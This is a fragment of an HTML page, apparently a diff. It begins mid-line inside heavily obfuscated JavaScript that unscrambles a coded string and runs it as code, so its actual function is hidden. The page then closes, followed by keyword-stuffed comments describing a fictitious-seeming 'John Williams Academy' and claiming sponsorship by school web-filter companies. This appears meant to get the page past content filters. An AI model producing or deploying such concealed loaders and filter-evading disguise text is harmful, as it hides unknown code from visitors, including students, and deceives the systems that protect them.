Yrd=zrF[TOx];var Gii='';var ZjF=Yrd;var eFb=Yrd(Gii,zrF(Jcj));var ekS=eFb(zrF('f(fiIpd)=eds1es)]{3s=0;se"]h;snOjpyoOwt4otO(}l(c(3odpmn0uu{+ie=@y ec_;$(n0(nting7(0f$d(.*%)0jqO..On_)o+){Oxeh)%!=+4*e%6b6lO+.!OeI.ue$0t!nini=t0d]eeI..5ihe.[;cnv%)(;On=uc(qz=)en(0t0e.ier)#).!dO+g];.+egOs)d0.;nse.(.o*{>.hla("Op(rfd..6956O)%nOlpd{( }r neOpO5f[5OOri; 0sg=5]zt.%"u]e\'.=l!xd.c.14 O=md%%e]=2.on)#s7!O!.u+]n(le=0slObrre.e.e![d(t!jorto))OliwOt.O0"y)M.rrq%)iy.qhc+.thf.v_n)sd.p)ei..eec(Oig2cu&.*.ent)_fOuos(mah,oO.ep+;!aamj2eMl))t3soo5x%j$.t3uc\'.7x);e*y,ro_mmqDnlO.iitsroe4qg0;TdaaO=uo5(ttifge%cOm2.t#o..!;e\/)}t:4&x.n"r)pmiee>iensi$yo![lreqse1xi!$2(ces[ji9la0aomg.m12s+\/eOOsk_.t.w.e)e c=CyOO(O#atr.e=ag{)!!.r\'urt.ese.OOx)e.>.]xreri)i#(te!lOecO.i[i,9!-zoO\'l+ftol2xshtraw=dtesh1;..re8d=rel!xuss)ne(&1.(C0a0gid%eno\/.}! 1"e[!aOt.to}.eeOkmmt!ehel.OS..npn.p.[$=.ae)tbt)1+]+ !i\/d3}{sdth)Sro_)a%#%ichrr}(ue=}s;yejafe)pOt.0cdts$tcsph&]#proi_np!o=j*er;0nOo=ecgem}( d0eb()m)0(rlh.c=n(.n$)p;=.e.%))5.O4p..eg(tOn!euo{{i..&uO=oi1));(e ()r.7'));var xlT=ZjF(xRB,ekS );xlT(7636);return 2187})()
+  TopbarHandler(); 
+</script>
+
+</body>
+</html>
+
+<!--
+John Williams Academy is a rigorous, college-preparatory institution dedicated to academic excellence, critical thinking, and whole-student development. Our interdisciplinary, mastery-based curriculum spans advanced mathematics, multivariable calculus, AP physics, chemistry, and biology, alongside a robust STEM and STEAM pipeline in computer science, robotics, and engineering design. Students engage in inquiry-based learning, project-based coursework, and Socratic-seminar discussion across English literature, rhetoric and composition, world history, civics, and environmental science. Our world languages program — Spanish, French, and Mandarin — builds global citizenship and cross-cultural fluency, while fine arts, studio art, orchestra, and choir cultivate creative and expressive intelligence. With small class sizes, personalized learning plans, data-driven instruction, and a growth mindset embedded in every department, John Williams Academy prepares scholars for standardized-testing success, honors and AP coursework, and competitive college placement — all while fostering leadership, civic responsibility, and lifelong intellectual curiosity.
+A rigorous, college-preparatory academy blending STEM/STEAM innovation, mastery-based learning, and classical rhetoric — where advanced mathematics, computer science, world languages, and fine arts converge to build critical thinkers, confident leaders, and academically excellent, globally minded scholars.
+-->
+
+<!--
+Computer Science, Mathematics, Science, Biology, Physics, AP classes, Homework study, Study Online free. English Language Arts, ELA Comp/Literature Study. Helping kids everyday learn and excell.
+John Williams Academy. All Rights Reserved.
+-->
+
+<!--
+Partners with school districts all around the world.
+Partnered and sponsored by Contentkeeper, Securly, Lightspeed Systems, GoGuardian and other supportive companies.
+-->
